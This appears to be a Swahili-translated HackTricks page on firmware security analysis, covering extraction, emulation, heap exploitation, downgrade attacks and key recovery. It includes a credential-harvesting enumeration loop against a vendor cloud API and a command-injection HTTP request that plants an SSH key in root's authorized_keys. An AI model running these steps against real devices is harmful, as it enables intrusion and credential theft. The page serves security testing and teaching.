# Uchambuzi wa Firmware

{{#include ../../banners/hacktricks-training.md}}

## **Utangulizi**

### Rasilimali zinazohusiana


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware ni software muhimu inayowezesha vifaa kufanya kazi ipasavyo kwa kudhibiti na kuwezesha mawasiliano kati ya vipengele vya hardware na software ambayo watumiaji huingiliana nayo. Huhifadhiwa katika memory ya kudumu, hivyo kuhakikisha kifaa kinaweza kufikia maagizo muhimu tangu kinapowashwa, na hivyo kuanzisha mfumo wa uendeshaji. Kuchunguza na huenda kurekebisha firmware ni hatua muhimu katika kutambua udhaifu wa kiusalama.<sup>[[2]](#references)[[3]](#references)</sup>

## **Kukusanya Taarifa**

**Kukusanya taarifa** ni hatua muhimu ya awali katika kuelewa muundo wa kifaa na teknolojia kinazotumia. Mchakato huu unahusisha kukusanya data kuhusu:

- Muundo wa CPU na mfumo wa uendeshaji unaoendesha
- Maelezo ya bootloader
- Muundo wa hardware na datasheets
- Vipimo vya codebase na maeneo ya source
- External libraries na aina za leseni
- Historia za updates na certifications za udhibiti
- Michoro ya architecture na flow
- Tathmini za usalama na udhaifu uliotambuliwa

Kwa madhumuni haya, zana za **open-source intelligence (OSINT)** ni muhimu sana, kama ilivyo uchanganuzi wa vipengele vyovyote vya open-source software vinavyopatikana kupitia michakato ya manual na automated review. Zana kama [Coverity Scan](https://scan.coverity.com) na [Semmle’s LGTM](https://lgtm.com/#explore) hutoa static analysis bila malipo ambayo inaweza kutumika kutafuta matatizo yanayoweza kuwepo.

## **Kupata Firmware**

Firmware inaweza kupatikana kupitia njia mbalimbali, kila moja ikiwa na kiwango chake cha ugumu:

- **Moja kwa moja** kutoka kwa chanzo (developers, manufacturers)
- **Kujenga** kwa kutumia maagizo yaliyotolewa
- **Kupakua** kutoka kwenye tovuti rasmi za support
- Kutumia queries za **Google dork** kutafuta firmware files zilizohostiwa
- Kufikia **cloud storage** moja kwa moja, kwa zana kama [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Kuingilia **updates** kwa kutumia mbinu za man-in-the-middle
- **Kutoa** kutoka kwenye kifaa kupitia miunganisho kama **UART**, **JTAG**, au **PICit**
- **Kusniff** update requests ndani ya mawasiliano ya kifaa
- Kutambua na kutumia **hardcoded update endpoints**
- **Kudump** kutoka kwenye bootloader au network
- **Kuondoa na kusoma** storage chip, endapo njia nyingine zote zitashindikana, kwa kutumia hardware tools zinazofaa

### UART-only logs: force a root shell via U-Boot env in flash

Ikiwa UART RX inapuuzwa (logs pekee), bado unaweza kulazimisha init shell kwa **kuhariri U-Boot environment blob** offline:<sup>[[6]](#references)</sup>

1. Dump SPI flash kwa SOIC-8 clip + programmer (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Tafuta U-Boot env partition, hariri `bootargs` ili ijumuishe `init=/bin/sh`, na **kokotoa upya U-Boot env CRC32** ya blob.
3. Reflash env partition pekee na uwashe upya; shell inapaswa kuonekana kwenye UART.

Hii ni muhimu kwenye embedded devices ambapo bootloader shell imezimwa lakini env partition inaweza kuandikwa kupitia external flash access.

## Kuchanganua firmware

Kwa kuwa sasa **una firmware**, unahitaji kutoa taarifa kuihusu ili kujua jinsi ya kuishughulikia. Kuna tools mbalimbali unazoweza kutumia kwa ajili hiyo:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Ikiwa hujapata mengi kwa kutumia zana hizo, angalia **entropy** ya image kwa `binwalk -E <bin>`. Ikiwa entropy ni ndogo, basi huenda haijasimbwa kwa njia fiche. Ikiwa entropy ni kubwa, huenda imesimbwa kwa njia fiche (au imebanwa kwa namna fulani).

Zaidi ya hayo, unaweza kutumia zana hizi kutoa **files zilizofichwa ndani ya firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Au [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) kukagua file.

### Kupata Filesystem

Kwa kutumia zana zilizotajwa awali kama `binwalk -ev <bin>`, ulipaswa kuweza **kutoa filesystem**.\
Kwa kawaida Binwalk huitoa ndani ya **folder iliyopewa jina la aina ya filesystem**, ambayo kwa kawaida huwa mojawapo ya hizi: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Utoaji wa Filesystem kwa Mikono

Wakati mwingine, binwalk **haitakuwa na magic byte ya filesystem kwenye signatures zake**. Katika hali hizi, tumia binwalk **kutafuta offset ya filesystem na ku-carve compressed filesystem** kutoka kwenye binary, kisha **utoe filesystem manually** kulingana na aina yake kwa kutumia hatua zilizo hapa chini.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Endesha **dd command** ifuatayo ili kutoa filesystem ya Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Vinginevyo, amri ifuatayo pia inaweza kutekelezwa.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Kwa squashfs (iliyotumika katika mfano hapo juu)

`$ unsquashfs dir.squashfs`

Faili zitakuwa katika saraka ya "`squashfs-root`" baadaye.

- Faili za archive za CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Kwa filesystems za jffs2

`$ jefferson rootfsfile.jffs2`

- Kwa filesystems za ubifs zenye NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Kuchanganua Firmware

Baada ya firmware kupatikana, ni muhimu kuichanganua kwa kina ili kuelewa muundo wake na udhaifu unaoweza kuwepo. Mchakato huu unahusisha kutumia zana mbalimbali kuchanganua na kutoa data muhimu kutoka kwenye firmware image.

### Zana za Uchambuzi wa Awali

Seti ya amri imetolewa kwa ukaguzi wa awali wa binary file (inayorejelewa kama `<bin>`). Amri hizi husaidia kutambua aina za faili, kutoa strings, kuchanganua binary data, na kuelewa maelezo ya partitions na filesystem:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Ili kutathmini hali ya usimbaji fiche wa image, **entropy** hukaguliwa kwa `binwalk -E <bin>`. Entropy ya chini huashiria ukosefu wa usimbaji fiche, huku entropy ya juu ikionyesha uwezekano wa usimbaji fiche au compression.

Kwa kutoa **embedded files**, tools na rasilimali kama nyaraka za **file-data-carving-recovery-tools** na **binvis.io** kwa ajili ya ukaguzi wa faili zinapendekezwa.

### Kutoa Mfumo wa Faili

Kwa kutumia `binwalk -ev <bin>`, kwa kawaida mtu anaweza kutoa mfumo wa faili, mara nyingi katika directory iliyopewa jina kulingana na aina ya mfumo wa faili (kwa mfano, squashfs, ubifs). Hata hivyo, **binwalk** inaposhindwa kutambua aina ya mfumo wa faili kwa sababu ya kukosekana kwa magic bytes, manual extraction inahitajika. Hii inahusisha kutumia `binwalk` kutafuta offset ya mfumo wa faili, kisha kutumia command ya `dd` ku-carve mfumo wa faili:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Baadaye, kulingana na aina ya filesystem (k.m., squashfs, cpio, jffs2, ubifs), commands tofauti hutumika kutoa yaliyomo manually.

### Uchambuzi wa Filesystem

Baada ya filesystem kutolewa, utafutaji wa security flaws huanza. Huangaliwa network daemons zisizo salama, credentials zilizowekwa moja kwa moja kwenye code, API endpoints, functionalities za update server, code ambayo haijacompile, startup scripts, na compiled binaries kwa ajili ya offline analysis.

**Maeneo muhimu** na **vipengee** vya kukagua ni pamoja na:

- **etc/shadow** na **etc/passwd** kwa user credentials
- SSL certificates na keys katika **etc/ssl**
- Configuration na script files kwa vulnerabilities zinazowezekana
- Embedded binaries kwa analysis zaidi
- Web servers na binaries za kawaida za IoT devices

Tools kadhaa husaidia kufichua sensitive information na vulnerabilities ndani ya filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) na [**Firmwalker**](https://github.com/craigz28/firmwalker) kwa kutafuta sensitive information
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) kwa comprehensive firmware analysis
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), na [**EMBA**](https://github.com/e-m-b-a/emba) kwa static na dynamic analysis

### Security Checks kwenye Compiled Binaries

Source code na compiled binaries zote zinazopatikana kwenye filesystem lazima zichunguzwe kwa vulnerabilities. Tools kama **checksec.sh** kwa Unix binaries na **PESecurity** kwa Windows binaries husaidia kutambua binaries zisizolindwa ambazo zinaweza kutumiwa kwa exploitation.

## Kukusanya cloud config na MQTT credentials kupitia derived URL tokens

IoT hubs nyingi huchukua per-device configuration yao kutoka cloud endpoint inayoonekana kama:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Wakati wa firmware analysis, unaweza kugundua kwamba `<token>` inatokana locally na device ID kwa kutumia hardcoded secret, kwa mfano:

- token = MD5( deviceId || STATIC_KEY ) na kuwakilishwa kama uppercase hex

Muundo huu humwezesha mtu yeyote anayejua deviceId na STATIC_KEY kutengeneza upya URL na kuchukua cloud config, ambayo mara nyingi hufichua MQTT credentials zilizo katika plaintext na topic prefixes.

Practical workflow:

1) Extract deviceId kutoka UART boot logs

- Unganisha 3.3V UART adapter (TX/RX/GND) na capture logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Tafuta mistari inayochapisha muundo wa URL wa cloud config na anwani ya broker, kwa mfano:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Pata STATIC_KEY na token algorithm kutoka firmware

- Pakia binaries kwenye Ghidra/radare2 na utafute config path ("/pf/") au MD5 usage.
- Thibitisha algorithm (kwa mfano, MD5(deviceId||STATIC_KEY)).
- Tengeneza token katika Bash na ubadilishe digest kuwa herufi kubwa:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Kusanya cloud config na MQTT credentials

- Unda URL na vuta JSON kwa curl; ichanganue kwa jq ili kutoa secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Tumia vibaya plaintext MQTT na weak topic ACLs (ikiwa zipo)

- Tumia credentials zilizopatikana ku-subscribe kwenye maintenance topics na utafute matukio nyeti:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerate vitambulisho vya vifaa vinavyotabirika (kwa kiwango kikubwa, kwa idhini)

- Ecosystem nyingi hujumuisha bytes za OUI ya vendor/product/type zikifuatiwa na kiambishi tamati cha mfuatano.
- Unaweza kupitia vitambulisho vinavyowezekana, kutoa tokens na kupata mipangilio kwa programmatically:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notes
- Daima pata authorization ya wazi kabla ya kujaribu mass enumeration.
- Pendelea emulation au static analysis ili kurejesha secrets bila kurekebisha target hardware inapowezekana.


Mchakato wa ku-emulate firmware huwezesha **dynamic analysis** ya uendeshaji wa kifaa au programu binafsi. Mbinu hii inaweza kukumbana na changamoto zinazohusiana na hardware au architecture, lakini kuhamisha root filesystem au binaries maalum kwenye kifaa chenye architecture na endianness zinazolingana, kama vile Raspberry Pi, au kwenye virtual machine iliyotengenezwa awali, kunaweza kuwezesha testing zaidi.

### Ku-emulate Binaries Binafsi

Kwa kuchunguza programs moja moja, ni muhimu kutambua endianness na CPU architecture ya program.

#### Mfano wa MIPS Architecture

Ili ku-emulate binary ya MIPS architecture, unaweza kutumia command:
```bash
file ./squashfs-root/bin/busybox
```
Na kusakinisha zana muhimu za emulation:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Kwa MIPS (big-endian), `qemu-mips` hutumiwa, na kwa binaries za little-endian, `qemu-mipsel` ndiyo chaguo.

#### Emulation ya ARM Architecture

Kwa binaries za ARM, mchakato ni sawa, huku emulator ya `qemu-arm` ikitumika kwa emulation.

### Emulation ya Full System

Tools kama [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), na nyinginezo, huwezesha full firmware emulation, hujiendesha mchakato kiotomatiki na kusaidia katika dynamic analysis.

## Dynamic Analysis kwa Vitendo

Katika hatua hii, mazingira ya kifaa halisi au kilicho-emulate hutumiwa kwa analysis. Ni muhimu kudumisha shell access kwa OS na filesystem. Emulation huenda isiige kikamilifu mwingiliano wa hardware, hivyo wakati mwingine kuanzisha upya emulation huwa muhimu. Analysis inapaswa kukagua filesystem tena, kutumia vibaya webpages na network services zilizo wazi, na kuchunguza vulnerabilities za bootloader. Firmware integrity tests ni muhimu ili kutambua potential backdoor vulnerabilities.

## Mbinu za Runtime Analysis

Runtime analysis inahusisha kuingiliana na process au binary katika mazingira yake ya uendeshaji, kwa kutumia tools kama gdb-multiarch, Frida, na Ghidra kuweka breakpoints na kutambua vulnerabilities kupitia fuzzing na mbinu nyingine.

Kwa embedded targets zisizo na debugger kamili, **copy a statically-linked `gdbserver`** kwenye kifaa na uunganishe remotely:<sup>[[6]](#references)</sup>
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Uchoraji wa ramani ya ujumbe wa Zigbee / radio-co-processor

Kwenye IoT hubs, RF stack mara nyingi hugawanywa kati ya **radio MCU** na mchakato wa Linux userland. Workflow muhimu ni kuchora ramani ya njia:<sup>[[8]](#references)</sup>

1. **RF frame** hewani
2. **controller-side parser** kwenye radio MCU
3. **serial/UART text au TLV protocol** inayotumwa kwa Linux (kwa mfano `/dev/tty*`)
4. **application dispatcher** kwenye main daemon
5. **protocol-specific handler / state machine**

Architecture hii huunda reversing targets mbili badala ya moja. Ikiwa controller inabadilisha binary radio frames kuwa textual protocol kama `Group,Command,arg1,arg2,...`, bainisha:

- **message groups** na dispatch tables
- Ni ujumbe upi unaweza kutoka **network** dhidi ya controller yenyewe
- **manufacturer-specific discriminator fields** halisi (kwa mfano Zigbee `manufacturer_code` na custom `cluster_command`)
- Ni handlers zipi zinapatikana tu wakati wa **commissioning**, discovery, au firmware/model download phases

Kwa Zigbee hasa, capture pairing traffic na uangalie ikiwa target bado inategemea default **Link Key** `ZigBeeAlliance09`. Ikiwa hivyo, sniffing commissioning traffic kunaweza kufichua **Network Key**. Zigbee 3.0 install codes hupunguza exposure hii, kwa hiyo tambua ikiwa kifaa kilichojaribiwa kinazitekeleza kweli.

### Manufacturer-specific protocol handlers na FSM-gated reachability

Vendor-specific Zigbee/ZCL commands mara nyingi huwa target bora kuliko standardized clusters kwa sababu zinaelekeza kwenye **custom parsing code** na internal **FSMs** zenye validation iliyojaribiwa kidogo.<sup>[[8]](#references)</sup>

Workflow ya vitendo:

- Reverse command dispatcher hadi upate **vendor-only handler**.
- Rejesha **FSM state**, **event**, **check**, **action**, na **next-state** tables.
- Tambua **transitional states** zinazoendelea kiotomatiki na retry/error branches ambazo hatimaye hu-reset au ku-free attacker-controlled state.
- Thibitisha ni protocol exchanges zipi halali zinazohitajika kuiweka daemon kwenye state iliyo hatarini badala ya kudhani kuwa buggy handler inapatikana kila wakati.

Kwa protocols zinazotegemea timing, packet replay kutoka Python framework inaweza kuwa polepole sana. Njia inayotegemeka zaidi ni ku-emulate kifaa halali kwenye real hardware (kwa mfano **nRF52840**) kwa kutumia vendor-grade stack ili uweze kuweka wazi **endpoints**, **attributes**, na commissioning timing sahihi.

### Aina ya bug ya fragmented-download kwenye embedded daemons

Aina ya bug inayojirudia kwenye **fragmented blob/model/configuration downloads** inaonekana kama ifuatavyo:<sup>[[8]](#references)</sup>

1. **First fragment** (`offset == 0`) huhifadhi `ctx->total_size` na kutenga `malloc(total_size)`.
2. Fragments zinazofuata huthibitisha tu fields zinazodhibitiwa na attacker za **packet-local**, kama vile `packet_total_size >= offset + chunk_len`.
3. Copy hutumia `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bila kuangalia dhidi ya **original allocated size**.

Hii humwezesha attacker kutuma:

- Fragment ya kwanza halali yenye declared total size **ndogo** ili kulazimisha small heap allocation.
- Fragment inayofuata yenye **expected offset** lakini `chunk_len` kubwa zaidi.
- Forged packet-local size inayotimiza fresh checks huku ikiendelea ku-overflow buffer iliyotengwa awali.

Njia iliyo hatarini ikiwa nyuma ya commissioning logic, exploitation lazima ijumuishe **device emulation** ya kutosha kuiendesha target hadi kwenye expected model-download au blob-download state kabla ya kutuma malformed fragments.

### Protocol-driven `free()` triggers

Kwenye embedded daemons, njia rahisi zaidi ya ku-trigger heap metadata exploitation mara nyingi si "kusubiri cleanup", bali ni **kulazimisha error handling ya protocol yenyewe**:<sup>[[8]](#references)</sup>

- Tuma malformed follow-up fragments ili kusukuma FSM kwenye **retry** au **error** states.
- Vuka retry threshold ili daemon **i-reset context** na ku-free corrupted buffer.
- Tumia `free()` hii inayotabirika ku-trigger allocator-side primitives kabla process haija-crash kwa sababu zisizohusiana.

Hii ni muhimu hasa dhidi ya allocators za **musl/uClibc/dlmalloc-like** kwenye embedded Linux, ambapo ku-corrupt chunk metadata kunaweza kubadilisha unlink/unbin logic kuwa write primitive. Pattern thabiti ni ku-corrupt **size field** ili kuelekeza allocator traversal kwenye **fake chunks** zilizowekwa ndani ya overflowed buffer, badala ya ku-overwrite mara moja bin pointers halisi na ku-crash process.

## Binary Exploitation and Proof-of-Concept

Kutengeneza PoC kwa vulnerabilities zilizobainishwa kunahitaji uelewa wa kina wa target architecture na programming katika lower-level languages. Binary runtime protections kwenye embedded systems ni nadra, lakini zinapokuwepo, techniques kama Return Oriented Programming (ROP) zinaweza kuhitajika.

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc hutumia fastbins zinazofanana na za glibc. Large allocation ya baadaye inaweza ku-trigger `__malloc_consolidate()`, kwa hiyo fake chunk yoyote lazima ipite checks (size inayofaa, `fd = 0`, na chunks zinazozunguka zionekane kuwa "in use").<sup>[[6]](#references)</sup>
- **Non-PIE binaries under ASLR:** ikiwa ASLR imewezeshwa lakini main binary ni **non-PIE**, addresses za `.data/.bss` zilizo ndani ya binary ni thabiti. Unaweza kulenga region ambayo tayari inafanana na valid heap chunk header ili ku-land fastbin allocation kwenye **function pointer table**.
- **Parser-stopping NUL:** JSON inapoparsed, `\x00` kwenye payload inaweza kusimamisha parsing huku ikihifadhi trailing attacker-controlled bytes kwa stack pivot/ROP chain.
- **Shellcode via `/proc/self/mem`:** ROP chain inayokiita `open("/proc/self/mem")`, `lseek()`, na `write()` inaweza kupanda executable shellcode kwenye known mapping na kuruka humo.

## Prepared Operating Systems for Firmware Analysis

Operating systems kama [AttifyOS](https://github.com/adi0x90/attifyos) na [EmbedOS](https://github.com/scriptingxss/EmbedOS) hutoa mazingira yaliyosanidiwa awali kwa firmware security testing, yakiwa na tools zinazohitajika.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS ni distro iliyokusudiwa kukusaidia kufanya security assessment na penetration testing ya Internet of Things (IoT) devices. Huokoa muda mwingi kwa kutoa mazingira yaliyosanidiwa awali yenye tools zote zinazohitajika.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Operating system ya embedded security testing inayotegemea Ubuntu 18.04 na iliyo na firmware security testing tools tayari.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Hata vendor anapotekeleza cryptographic signature checks kwa firmware images, **version rollback (downgrade) protection mara nyingi hukosekana**. Boot- au recovery-loader inapothibitisha signature kwa embedded public key pekee lakini hailinganishi *version* (au monotonic counter) ya image inayoflashwa, attacker anaweza kusakinisha kihalali **older, vulnerable firmware ambayo bado ina valid signature** na hivyo kurudisha vulnerabilities zilizokuwa patched.<sup>[[4]](#references)</sup>

Typical attack workflow:

1. **Pata older signed image**
* Ipakue kutoka vendor’s public download portal, CDN au support site.
* I-extract kutoka companion mobile/desktop applications (kwa mfano ndani ya Android APK chini ya `assets/firmware/`).
* Iipate kutoka third-party repositories kama VirusTotal, Internet archives, forums, n.k.
2. **Upload au serve image kwenye kifaa** kupitia exposed update channel yoyote:
* Web UI, mobile-app API, USB, TFTP, MQTT, n.k.
* Consumer IoT devices nyingi huweka wazi *unauthenticated* HTTP(S) endpoints zinazokubali Base64-encoded firmware blobs, kuzi-decode server-side na ku-trigger recovery/upgrade.
3. Baada ya downgrade, exploit vulnerability iliyokuwa patched kwenye release mpya zaidi (kwa mfano command-injection filter iliyoongezwa baadaye).
4. Kwa hiari flash image ya latest tena au disable updates ili kuepuka detection mara persistence inapopatikana.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Katika firmware iliyo hatarini (iliyoshushwa), parameter ya `md5` inaunganishwa moja kwa moja kwenye shell command bila sanitisation, hivyo kuruhusu injection ya commands za kiholela (hapa – kuwezesha root access inayotegemea SSH key). Matoleo ya baadaye ya firmware yalianzisha character filter ya msingi, lakini kutokuwepo kwa ulinzi dhidi ya downgrade kunafanya marekebisho hayo yasiwe na maana.<sup>[[4]](#references)</sup>

### Kutoa Firmware Kutoka kwenye Mobile Apps

Vendor wengi hujumuisha full firmware images ndani ya companion mobile applications ili app iweze ku-update device kupitia Bluetooth/Wi-Fi. Packages hizi kwa kawaida huhifadhiwa bila encryption kwenye APK/APEX, chini ya paths kama `assets/fw/` au `res/raw/`. Tools kama `apktool`, `ghidra`, au hata `unzip` ya kawaida hukuruhusu kutoa signed images bila kugusa physical hardware.<sup>[[4]](#references)</sup>
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Bypass ya anti-rollback inayotumika kwenye updater pekee katika miundo ya slot za A/B

Baadhi ya vendors hutekeleza **ratchet** ya kuzuia downgrade, lakini ndani ya mantiki ya *updater* pekee (kwa mfano routine ya UDS kupitia CAN, command ya recovery, au OTA agent ya userspace). Ikiwa **bootloader** baadaye hukagua tu signature/CRC ya image na kuamini partition table au slot metadata, ulinzi wa rollback bado unaweza bypassiwa.<sup>[[7]](#references)</sup>

Muundo dhaifu wa kawaida:

- Firmware metadata ina version descriptor na **security ratchet** / monotonic counter.
- Updater hulinganisha image ratchet na thamani iliyohifadhiwa kwenye persistent storage na kukataa signed images za zamani.
- **Bootloader** haiparsi ratchet hiyo na huthibitisha tu header, CRC, na signature kabla ya ku-boot slot iliyochaguliwa.
- Uamilishaji wa slot huhifadhiwa kando katika partition table au per-slot generation counter na **haujaunganishwa cryptographically** na firmware digest halisi iliyothibitishwa.

Hii huunda primitive ya **validate-one-image / boot-another-image** katika mifumo ya dual-slot. Ikiwa attacker anaweza kuifanya updater itie alama slot B kuwa lengo la boot linalofuata kwa kutumia signed image ya sasa, kisha aka-overwrite slot B kabla ya reboot, bootloader bado inaweza ku-boot image iliyodowngrade kwa sababu huamini tu slot metadata iliyokwisha commitiwa.

Muundo wa kawaida wa abuse:

1. Upload firmware **current signed** kwenye passive slot na utekeleze validation/switch routine ya kawaida ili layout iiteue slot hiyo kuwa active inayofuata.
2. **Usireboot bado**. Ingia tena kwenye slot-preparation/erase routine katika session hiyo hiyo.
3. Tumia vibaya boot-state iliyobaki au slot-selection logic iliyobaki ili updater ifute **physical slot hiyo hiyo** iliyokuwa imetangazwa kuwa active.
4. Andika firmware **ya zamani lakini bado signed** kwenye slot hiyo.
5. Ruka validation routine inayotekeleza ratchet na ufanye reboot moja kwa moja.
6. Bootloader huchagua slot iliyotangazwa, huthibitisha signature/integrity pekee, na ku-boot image ya zamani.

Mambo ya kutafuta unapofanya reverse A/B update implementations:

- Slot selection inayotokana na **boot-time flags** ambazo hazirefreshwi baada ya switch iliyofanikiwa.
- Routine ya mtindo wa `prepare_passive_slot()` inayofuta slot kwa kutumia state iliyobaki badala ya **current committed layout**.
- Function ya mtindo wa `part_write_layout()` inayoongeza tu **generation counter** / active flag na haihifadhi validated image hash.
- Ukaguzi wa ratchet uliotekelezwa katika userspace au updater code, lakini **haupo** katika ROM / bootloader / secure boot stages.
- Erase au recovery routines zinazoacha slot ikiwa imetiwa alama kuwa bootable hata baada ya maudhui yake kuondolewa na kuandikwa upya.

### Checklist ya Kutathmini Update Logic

* Je, transport/authentication ya *update endpoint* imelindwa vya kutosha (TLS + authentication)?
* Je, device inalinganisha **version numbers** au **monotonic anti-rollback counter** kabla ya flashing?
* Je, image inathibitishwa ndani ya secure boot chain (kwa mfano signatures zinakaguliwa na ROM code)?
* Je, **bootloader inatekeleza ratchet hiyo hiyo** kama updater, badala ya kukagua signature/CRC pekee?
* Je, slot activation metadata **imefungwa kwenye validated firmware digest/version**, au slot inaweza kurekebishwa baada ya promotion?
* Baada ya slot switch kufanikiwa, je, device inalazimishwa kureboot au update/erase routines za baadaye bado zinaweza kufikiwa katika session hiyo hiyo?
* Je, userland code hufanya sanity checks za ziada (kwa mfano allowed partition map, model number)?
* Je, *partial* au *backup* update flows zinatumia tena validation logic hiyo hiyo?

> 💡  Ikiwa lolote kati ya yaliyo hapo juu halipo, platform huenda iko vulnerable kwa rollback attacks.

## Firmware iliyo vulnerable kwa mazoezi

Ili kufanya mazoezi ya kugundua vulnerabilities katika firmware, tumia miradi ifuatayo ya vulnerable firmware kama sehemu ya kuanzia.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Kurejesha firmware decryption keys kutoka embedded KMS/Vault state

Wakati update image inachanganya plaintext metadata ndogo na blob kubwa yenye high entropy, fanya container triage kabla ya kujaribu brute-force chochote:<sup>[[1]](#references)</sup>

- Dump headers, offsets na line boundaries kwa kutumia `hexdump`, `xxd`, `strings -tx`, `base64 -d`, na `binwalk -E`.
- `Salted__` kwa kawaida humaanisha OpenSSL `enc` format: bytes 8 zinazofuata ni salt na bytes zilizobaki ni ciphertext.
- Sehemu ya Base64 inayodecode kuwa bytes `256` kamili ni dokezo kubwa kwamba unatazama RSA-2048 ciphertext inayofunga random firmware password/session key.
- Detached PGP material katika file hiyo hiyo mara nyingi hulinda authenticity pekee; usidhani kuwa ndiyo confidentiality mechanism.

Ikiwa static key hunting (`grep`, `strings`, PEM/PGP searches) itashindikana, reverse **operational decrypt path** badala ya kutafuta private keys pekee:

- Decompile updater / management binary na ufuatilie ni nani anayesoma encrypted blob, ni helper/API gani inayoi-unwrap, na logical key name gani inayoombwa.
- Tafuta KMS state kwenye extracted root filesystem (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) pamoja na unit files na init scripts.
- Chukulia plaintext `vault operator unseal ...`, recovery keys, bootstrap tokens, au local KMS auto-unseal scripts kuwa sawa na private-key material.

